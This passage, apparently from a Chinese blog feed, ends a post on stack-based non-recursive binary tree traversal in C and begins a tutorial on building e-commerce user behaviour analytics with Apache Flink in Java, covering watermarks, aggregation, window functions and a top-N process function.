<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Data;</span><br><span class="line">    BinTree Left;</span><br><span class="line">    BinTree Right;</span><br><span class="line">&#125;BiTNode，*BiTree;</span><br></pre></td></tr></table></figure>

<p>我们先解决一下中序的非递归</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraversal</span><span class="params">(BiTree BT)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    BiTree T = BT;</span><br><span class="line">    Stack S = CreatStack(MaxSize); <span class="comment">//创建并初始化堆栈S</span></span><br><span class="line">    <span class="keyword">while</span>(T || !IsEmpty(S))</span><br><span class="line">　　&#123;</span><br><span class="line">    　　<span class="keyword">while</span>(T)    <span class="comment">//一直向左并将沿途节点压入堆栈</span></span><br><span class="line">    　　&#123; </span><br><span class="line">       　　 Push(S,T);</span><br><span class="line">        　　T = T-&gt;Left;</span><br><span class="line">    　　&#125;</span><br><span class="line">    　　<span class="keyword">if</span>(!IsEmpty(S))</span><br><span class="line">    　　&#123;</span><br><span class="line">       　　 T = Pop(S);                <span class="comment">//节点弹出堆栈</span></span><br><span class="line">       　　 <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, T-&gt;Data);    <span class="comment">//（访问） 打印结点</span></span><br><span class="line">      　　  T = T-&gt;Right;              <span class="comment">//转向右子树</span></span><br><span class="line">    　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>中序的逻辑其实不复杂，借助了一个辅助栈，如果发现该点有左结点，就将其压入栈，直到没有发现左节点时弹出，然后还需要检查弹出的这个结点是否有有结点，然后对这个有结点又要找是否有左结点，有的话再次压入栈中，周而复始，不断查询的过程，可能说的有点乱，抱歉，画个图就懂了</p>
<p>然后接下来就是后序的遍历咯</p>
<p>先序遍历顺序：根节点-左孩子-右孩子<br>后序遍历顺序：左孩子-右孩子-根节点<br>后序遍历倒过来：根节点-右孩子-左孩子</p>
<p>对比发现，先序和后序（倒）访问顺序只有左孩子和右孩子颠倒了一下</p>
<p>那么我们在先序遍历的时候左右调换，依次压入栈，然后出栈即可获得</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraversal</span><span class="params">(BiTree BT)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTree T = BT;</span><br><span class="line">    Stack S1 = CreatStack(MAX_SIZE);    <span class="comment">//创建并初始化堆栈S1</span></span><br><span class="line">    Stack S2 = CreatStack(MAX_SIZE);    <span class="comment">//创建并初始化堆栈S2   </span></span><br><span class="line">    <span class="keyword">while</span>(T || !IsEmpty(S1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(T)        <span class="comment">//一直向右并将沿途节点访问（压入S2）后压入堆栈S1 </span></span><br><span class="line">        &#123;</span><br><span class="line">            Push(S2, T);</span><br><span class="line">            Push(S1, T);</span><br><span class="line">            T = T-&gt;Right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!IsEmpty(S1))</span><br><span class="line">        &#123;</span><br><span class="line">            T = Pop(S1);    <span class="comment">//节点弹出堆栈</span></span><br><span class="line">            T = T-&gt;Left;  <span class="comment">//转向左子树</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(S2))    <span class="comment">//访问（打印）S2中元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        T = Pop(S2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, T-&gt;Data);</span><br><span class="line">    &#125;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法空间复杂度确实一般，但我觉得比较好理解，还有另一种思路，等派上用处了再学吧</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>电商用户行为分析-Flink</title>
    <url>/2021/08/02/%E7%94%B5%E5%95%86%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>尚硅谷大数据实战_电商用户行为分析（项目开发实战）学习，原始项目使用scala，自己尝试用java重写。也会结合官方文档，介绍一些api的用处。</p>
<p><a href="https://github.com/BigDataScholar/FlinkECUserBehaviorAnalysis">学习链接</a></p>
<p><a href="https://github.com/woaixiaoyuyu/FlinkECUserBehaviorAnalysis">代码仓库链接</a></p>
<span id="more"></span>

<h2 id="项目整体介绍"><a href="#项目整体介绍" class="headerlink" title="项目整体介绍"></a>项目整体介绍</h2><h3 id="项目主要模块"><a href="#项目主要模块" class="headerlink" title="项目主要模块"></a>项目主要模块</h3><p>基于对电商用户行为数据的基本分类，我们可以发现主要有以下三个分析方向：</p>
<ol>
<li>热门统计</li>
</ol>
<p>利用用户的点击浏览行为，进行流量统计、近期热门商品统计等。</p>
<ol start="2">
<li>偏好统计</li>
</ol>
<p>利用用户的偏好行为，比如收藏、喜欢、评分等，进行用户画像分析，给出个性化的商品推荐列表。</p>
<ol start="3">
<li>风险控制</li>
</ol>
<p>利用用户的常规业务行为，比如登录、下单、支付等，分析数据，对异常情况进行报警提示。</p>
<p>本项目限于数据，我们只实现热门统计和风险控制中的部分内容，将包括以下五大模块：实时热门商品统计、实时流量统计、市场营销商业指标统计、恶意登录监控和订单支付失效监控，其中细分为以下9个具体指标：</p>
<p>[<img src="https://z3.ax1x.com/2021/07/18/W8QTNq.md.png" alt="W8QTNq.md.png"></p>
<p>由于对实时性要求较高，我们会用flink作为数据处理的框架。在项目中，我们将综合运用flink的各种API，基于EventTime去处理基本的业务需求，并且灵活地使用底层的processFunction，基于状态编程和CEP去处理更加复杂的情形。</p>
<h3 id="数据源解析"><a href="#数据源解析" class="headerlink" title="数据源解析"></a>数据源解析</h3><p>行为数据UserBehavior</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>数据类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>userId</td>
<td>Long</td>
<td>加密后的用户ID</td>
</tr>
<tr>
<td>itemId</td>
<td>Long</td>
<td>加密后的商品ID</td>
</tr>
<tr>
<td>categoryId</td>
<td>Int</td>
<td>加密后的商品所属类别ID</td>
</tr>
<tr>
<td>behavior</td>
<td>String</td>
<td>用户行为类型，包括(‘pv’, ‘’buy, ‘cart’, ‘fav’)</td>
</tr>
<tr>
<td>timestamp</td>
<td>Long</td>
<td>行为发生的时间戳，单位秒</td>
</tr>
</tbody></table>
<p>web日志数据</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>数据类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ip</td>
<td>String</td>
<td>访问的 IP</td>
</tr>
<tr>
<td>userId</td>
<td>Long</td>
<td>访问的 user ID</td>
</tr>
<tr>
<td>eventTime</td>
<td>Long</td>
<td>访问时间</td>
</tr>
<tr>
<td>method</td>
<td>String</td>
<td>访问方法 GET/POST/PUT/DELETE</td>
</tr>
<tr>
<td>url</td>
<td>String</td>
<td>访问的 url</td>
</tr>
</tbody></table>
<h3 id="热门时事商品统计"><a href="#热门时事商品统计" class="headerlink" title="热门时事商品统计"></a>热门时事商品统计</h3><h4 id="基本需求"><a href="#基本需求" class="headerlink" title="基本需求"></a>基本需求</h4><ul>
<li>统计近一小时热门商品，每五秒钟更新一次</li>
<li>热门数用浏览度pv来衡量</li>
</ul>
<h4 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h4><ul>
<li>过滤出用户行为中的pv</li>
<li>构建滑动窗口</li>
</ul>
<h5 id="按照商品id进行分区"><a href="#按照商品id进行分区" class="headerlink" title="按照商品id进行分区"></a>按照商品id进行分区</h5><p>.keyBy(“itemid”)</p>
<h5 id="设置时间窗口"><a href="#设置时间窗口" class="headerlink" title="设置时间窗口"></a>设置时间窗口</h5><p>.timeWindow(Time.minutes(60),Time.minutes(5)) 滑动窗口</p>
<p>时间窗口左闭右开，同一份数据可以发送给满足条件的多份窗口</p>
<h5 id="窗口聚合"><a href="#窗口聚合" class="headerlink" title="窗口聚合"></a>窗口聚合</h5><p>.aggregate(new CountAgg(),new WindowResultFunction())</p>
<p>new CountAgg()：定义聚合规则</p>
<p>new WindowResultFunction()：定义输出的数据结构</p>
<h3 id="实时流量统计–热门页面"><a href="#实时流量统计–热门页面" class="headerlink" title="实时流量统计–热门页面"></a>实时流量统计–热门页面</h3><h4 id="基本需求-1"><a href="#基本需求-1" class="headerlink" title="基本需求"></a>基本需求</h4><ul>
<li>从web服务器日志中，统计实时热门访问页面</li>
<li>统计每分钟ip访问量，取出访问量最大的五个地址，每五秒更新一次</li>
</ul>
<h4 id="解决思路-1"><a href="#解决思路-1" class="headerlink" title="解决思路"></a>解决思路</h4><ul>
<li>将日志中的时间转换为时间戳</li>
<li>构建滑动窗口</li>
</ul>
<h3 id="市场营销分析–APP市场推广统计"><a href="#市场营销分析–APP市场推广统计" class="headerlink" title="市场营销分析–APP市场推广统计"></a>市场营销分析–APP市场推广统计</h3><h4 id="基本需求-2"><a href="#基本需求-2" class="headerlink" title="基本需求"></a>基本需求</h4><ul>
<li>统计APP市场推广的数据指标</li>
<li>按照不同的推广渠道，分别统计数据</li>
</ul>
<h4 id="解决思路-2"><a href="#解决思路-2" class="headerlink" title="解决思路"></a>解决思路</h4><ul>
<li>通过滤过，按照不同渠道进行统计</li>
<li>自定义processFunction</li>
</ul>
<h3 id="市场营销分析–页面广告统计"><a href="#市场营销分析–页面广告统计" class="headerlink" title="市场营销分析–页面广告统计"></a>市场营销分析–页面广告统计</h3><h4 id="基本需求-3"><a href="#基本需求-3" class="headerlink" title="基本需求"></a>基本需求</h4><ul>
<li>按照不同省份，统计每小时页面访问量，五秒钟统计一次</li>
<li>对于频繁的点击行为进行过滤，放入黑名单</li>
</ul>
<h4 id="解决思路-3"><a href="#解决思路-3" class="headerlink" title="解决思路"></a>解决思路</h4><ul>
<li>滑动窗口</li>
<li>利用processFunction进行黑名单过滤</li>
</ul>
<p>其实需求的具体细节还有很多，代码实现中再展开。</p>
<h2 id="项目编写"><a href="#项目编写" class="headerlink" title="项目编写"></a>项目编写</h2><h3 id="热门商品统计"><a href="#热门商品统计" class="headerlink" title="热门商品统计"></a>热门商品统计</h3><h4 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// userID,itemId,categoryId,mode,timeStamp</span></span><br><span class="line"><span class="number">543462</span>,<span class="number">1715</span>,<span class="number">1464116</span>,pv,<span class="number">1511658000</span></span><br></pre></td></tr></table></figure>

<h4 id="定义数据输入输出的结构"><a href="#定义数据输入输出的结构" class="headerlink" title="定义数据输入输出的结构"></a>定义数据输入输出的结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input structure</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBehavior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> userId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> itemId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> categoryId;</span><br><span class="line">    <span class="keyword">public</span> String behavior;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> timeStamp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserBehavior</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserBehavior</span><span class="params">(<span class="keyword">long</span> userId, <span class="keyword">long</span> itemId, <span class="keyword">int</span> categoryId, String behavior, <span class="keyword">long</span> timeStamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.itemId = itemId;</span><br><span class="line">        <span class="keyword">this</span>.categoryId = categoryId;</span><br><span class="line">        <span class="keyword">this</span>.behavior = behavior;</span><br><span class="line">        <span class="keyword">this</span>.timeStamp = timeStamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserBehavior&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&quot;</span> + userId +</span><br><span class="line">                <span class="string">&quot;, itemId=&quot;</span> + itemId +</span><br><span class="line">                <span class="string">&quot;, categoryId=&quot;</span> + categoryId +</span><br><span class="line">                <span class="string">&quot;, behavior=&#x27;&quot;</span> + behavior + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, timeStamp=&quot;</span> + timeStamp +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output structure</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItemViewCount</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> itemID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> windowEnd;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemViewCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemViewCount</span><span class="params">(<span class="keyword">long</span> itemID, <span class="keyword">long</span> windowEnd, <span class="keyword">long</span> count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.itemID = itemID;</span><br><span class="line">        <span class="keyword">this</span>.windowEnd = windowEnd;</span><br><span class="line">        <span class="keyword">this</span>.count = count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ItemViewCount&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;itemID=&quot;</span> + itemID +</span><br><span class="line">                <span class="string">&quot;, windowEnd=&quot;</span> + windowEnd +</span><br><span class="line">                <span class="string">&quot;, count=&quot;</span> + count +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Watermarks"><a href="#Watermarks" class="headerlink" title="Watermarks"></a>Watermarks</h4><p>为了使用<em>事件时间</em>语义，Flink 应用程序需要知道事件<em>时间戳</em>对应的字段，意味着数据流中的每个元素都需要拥有<em>可分配</em>的事件时间戳。其通常通过使用 <code>TimestampAssigner</code> API 从元素中的某个字段去访问/提取时间戳。</p>
<p>时间戳的分配与 watermark 的生成是齐头并进的，其可以告诉 Flink 应用程序事件时间的进度。其可以通过指定 <code>WatermarkGenerator</code> 来配置 watermark 的生成方式。</p>
<p>使用 Flink API 时需要设置一个同时包含 <code>TimestampAssigner</code> 和 <code>WatermarkGenerator</code> 的 <code>WatermarkStrategy</code>。<code>WatermarkStrategy</code> 工具类中也提供了许多常用的 watermark 策略，并且用户也可以在某些必要场景下构建自己的 watermark 策略。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置水印，处理乱序数据</span></span><br><span class="line"><span class="comment">// 水印策略，有界无序，定义一个固定延迟事件</span></span><br><span class="line"><span class="comment">// 同时时间的语义，由我们对象中的timeStamp指定</span></span><br><span class="line">SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorWatermark = userBehaviorStream.assignTimestampsAndWatermarks(WatermarkStrategy</span><br><span class="line">.&lt;UserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">.withTimestampAssigner((event, timeStamp) -&gt; event.timeStamp * <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>

<h4 id="AggregateFunction自定义聚合规则"><a href="#AggregateFunction自定义聚合规则" class="headerlink" title="AggregateFunction自定义聚合规则"></a>AggregateFunction自定义聚合规则</h4><p>AggregateFunction比ReduceFunction更加通用，它有三个参数：输入类型（IN），累加器类型（ACC）和输出类型（OUT）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">UserBehavior</span>,<span class="title">Long</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义初始值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组内规则</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(UserBehavior userBehavior, Long aLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long aLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组间规则</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long aLong, Long acc1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="WindowFunction自定义窗口处理元素的规则"><a href="#WindowFunction自定义窗口处理元素的规则" class="headerlink" title="WindowFunction自定义窗口处理元素的规则"></a>WindowFunction自定义窗口处理元素的规则</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Public</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">WindowFunction</span>&lt;<span class="title">IN</span>, <span class="title">OUT</span>, <span class="title">KEY</span>, <span class="title">W</span> <span class="keyword">extends</span> <span class="title">Window</span>&gt; <span class="keyword">extends</span> <span class="title">Function</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">(KEY var1, W var2, Iterable&lt;IN&gt; var3, Collector&lt;OUT&gt; var4)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="处理函数（ProcessFunctions）"><a href="#处理函数（ProcessFunctions）" class="headerlink" title="处理函数（ProcessFunctions）"></a>处理函数（ProcessFunctions）</h4><p><code>ProcessFunction</code> 将事件处理与 Timer，State 结合在一起，使其成为流处理应用的强大构建模块。 这是使用 Flink 创建事件驱动应用程序的基础。它和 <code>RichFlatMapFunction</code> 十分相似， 但是增加了 Timer。</p>
<p>这里展示了其中一种ProcessFunction。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">K</span>, <span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractRichFunction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">KeyedProcessFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(I var1, KeyedProcessFunction&lt;K, I, O&gt;.Context var2, Collector&lt;O&gt; var3)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, KeyedProcessFunction&lt;K, I, O&gt;.OnTimerContext ctx, Collector&lt;O&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TopNHotItems</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>,<span class="title">ItemViewCount</span>,<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">// 定义一个状态变量 list state，用来保存所有的 ItemViewCont</span></span><br><span class="line">    <span class="keyword">public</span> ListState&lt;ItemViewCount&gt; itemState;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotItems</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 在执行processElement方法之前，会最先执行并且只执行一次 open 方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        itemState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;ItemViewCount&gt;(<span class="string">&quot;itemState&quot;</span>,ItemViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(ItemViewCount itemViewCount, Context context, Collector&lt;String&gt; collector)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        itemState.add(itemViewCount);</span><br><span class="line">        <span class="comment">// 注册 windowEnd+1 的 EventTime Timer, 延迟触发，当触发时，说明收齐了属于windowEnd窗口的所有商品数据，统一排序处理</span></span><br><span class="line">        context.timerService().registerEventTimeTimer(itemViewCount.windowEnd+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时器触发时，会执行这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 已经收集到所有的数据，首先把所有的数据放到一个 List 中</span></span><br><span class="line">        List&lt;ItemViewCount&gt; allItems = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Iterable&lt;ItemViewCount&gt; itemViewCounts = itemState.get();</span><br><span class="line">        Iterator&lt;ItemViewCount&gt; iterator = itemViewCounts.iterator();</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt&gt;=<span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">            allItems.add(iterator.next());</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 清除状态</span></span><br><span class="line">        itemState.clear();</span><br><span class="line">        <span class="comment">// 按照 count 大小  倒序排序</span></span><br><span class="line">        Collections.sort(allItems, <span class="keyword">new</span> Comparator&lt;ItemViewCount&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(ItemViewCount o1, ItemViewCount o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(o1.count&gt;o2.count) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(o1.count==o2.count) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        result.append(<span class="string">&quot;======================================================\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 触发定时器时，我们多设置了1秒的延迟，这里我们将时间减去0.1获取到最精确的时间</span></span><br><span class="line">        result.append(<span class="string">&quot;时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(ItemViewCount elem:allItems) result.append(elem.toString());</span><br><span class="line">        result.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        result.append(<span class="string">&quot;======================================================\n&quot;</span>);</span><br><span class="line">        out.collect(result.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><p>注释还是写得很详细的，层层递进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.eventtime.WatermarkStrategy;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FilterFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStreamSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 热门时事商品统计</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Xiaoyuyu</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateDate</span>: 2021/7/18 3:42 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// input structure</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBehavior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> userId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> itemId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> categoryId;</span><br><span class="line">    <span class="keyword">public</span> String behavior;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> timeStamp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserBehavior</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserBehavior</span><span class="params">(<span class="keyword">long</span> userId, <span class="keyword">long</span> itemId, <span class="keyword">int</span> categoryId, String behavior, <span class="keyword">long</span> timeStamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.itemId = itemId;</span><br><span class="line">        <span class="keyword">this</span>.categoryId = categoryId;</span><br><span class="line">        <span 